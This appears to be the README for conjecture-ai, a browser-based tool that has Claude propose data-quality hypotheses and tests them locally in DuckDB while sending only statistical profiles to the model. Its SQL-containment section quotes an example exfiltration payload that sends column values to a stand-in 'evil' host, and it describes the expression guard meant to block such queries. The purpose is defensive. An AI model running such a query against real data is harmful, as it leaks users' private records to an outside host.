# conjecture-ai

**[conjecture-ai.com](https://conjecture-ai.com)**

Point it at one or more datasets and it proposes **falsifiable invariant hypotheses** about them, tests each
one locally, and tells you which are false. Feed the verdicts back and it narrows down *why*.

Everything runs in your browser. DuckDB-WASM loads the files, profiles every column and evaluates
every check. The only thing that leaves the page is a statistical profile, plus the pass/fail
counts of what has already been tested. **No cell values are ever transmitted.**

```
URLs and files → validate → load into DuckDB → profile → ask the AI → test locally
                                                            ▲            │
                                                            └── verdicts ┘   (up to 3 rounds)
```

The [Claude Code transcript](https://conjecture-ai.com/claude-code-transcript/) that built this is
published alongside it: 39 prompts over 8 pages, including the dead ends.

## Quick start

```bash
npm install
cp .dev.vars.example .dev.vars     # add your Anthropic API key
npm run dev                        # next on :3000, worker on :8787
```

It lands in demo mode with Commerce pre-selected; one click loads it. Switch to **Your Own Data**
for a CORS-enabled Parquet/CSV/JSON URL or your own files.

## Demo datasets

Three ship in `public/data`, listed in `lib/demo.ts`.

| | Tables | Rows | Credit |
|---|---|---|---|
| **Commerce** (default) | 7 | 185k | Synthetic, generated for this demo. Schema inspired by Olist. |
| **Flights** | 1 | 91k | US DOT, Bureau of Transportation Statistics, June 2024. Public domain. |
| **Cars** | 1 | 406 | [vega-datasets](https://github.com/vega/vega-datasets) (BSD-3-Clause). |

Commerce is the default because cross-table relationships are exactly what a single-table profile
cannot reveal. All three are seeded with real defects, so the demo does not merely report that
everything is fine.

## Iterative rounds

One pass finds that something is broken; it takes another to work out what. A run is up to **three
rounds**: round 1 reads the profile, and each follow-up receives the verdicts of everything already
tested.

Round 1 is told the follow-ups are coming, which changes what it asks for: diagnostic hypotheses
chosen because either answer is informative, narrowing left for later. A live run over Commerce:

| Round 1 found | Round 2 concluded |
|---|---|
| 100 orders reference a customer that does not exist | Those 100 are exactly the malformed short `customer_id`s: every value matches the shape `A{3}-9{7}` |
| A composite `(product_id, seller_id, product_category)` check fails on 40 rows | `product_category` is the culprit; it mismatches on those 40 while `seller_id` **holds** |
| 40 rows break lifecycle timestamp ordering | `created_at` is not the earliest (40); `delivered_at >= shipped_at` **holds** |

The second round identified a root cause from the *masked shape histogram*, having never seen a
value.

Hypotheses render as soon as the model replies and fill in as each check lands, one round at a time
with tabs across the top. **Export Report** downloads the run as Markdown, with each verdict, count,
duration and the SQL behind it. That matters because **nothing here is persisted**: a reload loses
the data and every round.

## What leaves the browser, and what does not

| Sent | Not sent |
|---|---|
| Table and column names, DuckDB type names | Any cell value |
| Counts, percentages, numeric and date ranges | String min/max, top-k values, row samples |
| String length and character-class distributions | Violating rows, and the generated SQL |
| Masked shapes: `aaron.blake@acme.io` → `a{5}.a{5}@a{4}.aa` | |
| On later rounds, pass/fail counts of prior checks | |

Enforced in three places: `assertNoValues()` gates the profile client-side, the Worker re-parses it
through the same zod schema so a modified client cannot widen it, and tests profile fixtures seeded
with realistic PII and assert none of it survives. **Inspect Prompt** shows the exact request body,
so none of it needs taking on trust.

Feeding verdicts back added one hazard worth naming: DuckDB embeds offending values in its error
messages (`Could not convert string 'aaron.blake@acme.io' to DOUBLE`), so a raw reason would hand a
cell value straight back. `lib/hypotheses/findings.ts` reduces every reason to a category plus
identifiers the model already has, discarding all quoted text.

Each round is exactly one request and one response. No agent loop and no tools declared at all, so
the model cannot ask for another turn; the Worker counts its own HTTP calls, making that measured
rather than asserted.

## How generated SQL is contained

The AI writes checks that run against your data, so `read_csv('https://evil/?leak=' || email)`
would defeat the point. Two independent layers stop it.

**The model never emits raw SQL.** It emits a structured check naming its table, and we build the
query around it, so the `FROM` clause is always ours and the result is always a count:

```ts
type Check =
  | { kind: 'row_predicate'; table: string; expression: string }
  | { kind: 'unique'; table: string; columns: string[] }
  | { kind: 'references'; table: string; columns: string[];
      referencesTable: string; referencesColumns: string[] }
```

`lib/hypotheses/guard.ts` rejects any expression containing `SELECT`, a semicolon, a comment marker,
or a function that can reach a file or URL. Banning `SELECT` removes subquery exfiltration entirely;
a row predicate never needs one.

`references` is direction-agnostic: `lineitem → orders` asks whether every line belongs to a real
order, and reversing it asks whether every order has a line. It is refused when the two sides are
different type families, because DuckDB coerces silently: a BIGINT key joined to a zero-padded
VARCHAR key matches `'0001'` to `1`. Measured, that returned 1 violation where the truth was 3, and
a quietly wrong answer is the worst thing this tool can produce.

**DuckDB has the capability taken away.** Every source is materialised into a table, then
`SET enable_external_access=false` runs before any generated SQL. A test proves a remote read
actually fails afterwards, and that the lockdown is re-applied on every rebuild rather than only
the first.

## SQL console

**SQL Console** opens DuckDB over your loaded tables, on CodeMirror with the SQL language mode, so
completion offers your real column names. It opens seeded rather than blank: every check already
run is included commented out, so a falsified result can be taken apart by uncommenting it.
`Cmd`/`Ctrl`+`Enter` runs the statement under the cursor or the selection; splitting on `;` skips
semicolons inside literals, comments and dollar-quoted blocks, which matters because the buffer
arrives full of comments.

Results page fifty rows at a time from Arrow, and the dialog holds a fixed size. The console runs
against the same locked-down database, so a query typed here cannot reach a file or URL either.

## Deploy

```bash
npx wrangler login
npx wrangler secret put ANTHROPIC_API_KEY
npm run deploy
```

Then protect it: dashboard → Workers & Pages → conjecture-ai → **Access** tab → "Protect this
Worker behind Access". This works on the `workers.dev` hostname with no custom domain. **Without
it, anyone who finds the URL can spend your API key.**

It is also kept out of search engines and AI training sets: `preview_urls: false`,
`X-Robots-Tag: noindex` on both asset and Worker responses, and a `robots.txt` naming 53 crawlers
alongside the wildcard. The names matter because `Google-Extended` and `Applebot-Extended` are not
crawlers at all but AI-training opt-out tokens, ignored under `User-agent: *`. All voluntary,
though; Access is the only part that enforces.

## Layout

```
app/                    one page, client-side
components/             source manager, profile panel, hypothesis list, modals, SQL console
lib/demo.ts             the three bundled datasets and their manifests
lib/report.ts           the Markdown export
lib/sources/validate.ts URL preflight: CORS, ranges, size, magic-byte format sniffing
lib/duckdb/             bundles (swappable CDN → R2), client, table naming, rebuild + lockdown
lib/profile/            SQL builders, orchestration, shape masking, redaction
lib/hypotheses/         shared schema, expression guard, local evaluation, findings
lib/sql/statements.ts   statement splitting for the console
worker/                 Hono: /api/health, /api/hypotheses  (the only server code)
```

`lib/duckdb/bundles.ts` is the only file that knows where the WebAssembly comes from. It cannot
ship in Cloudflare's static assets, since `duckdb-eh.wasm` is 34 MiB against a 25 MiB per-file
limit, so it loads from jsDelivr. To self-host, set `NEXT_PUBLIC_DUCKDB_BASE_URL`.

## Tests

```bash
npm test
```

156 tests. Profiling and evaluation run against a real DuckDB via duckdb-wasm's Node build, so they
exercise the same SQL the browser does; `test/integration.test.ts` loads a real remote Parquet file
end to end.

## Known limits

- Nothing is persisted. A reload loses the loaded data and every round; export before you leave.
- Every loaded source is held in memory, so very large files are slow. The UI warns above 500 MB.
- Single-threaded DuckDB; the threaded build needs site-wide cross-origin isolation.
- Cross-table checks are value containment; arbitrary joins are not expressible.
- `claude-opus-5`, hardcoded server-side. Roughly $0.40 a round on Commerce, 80-110s each.
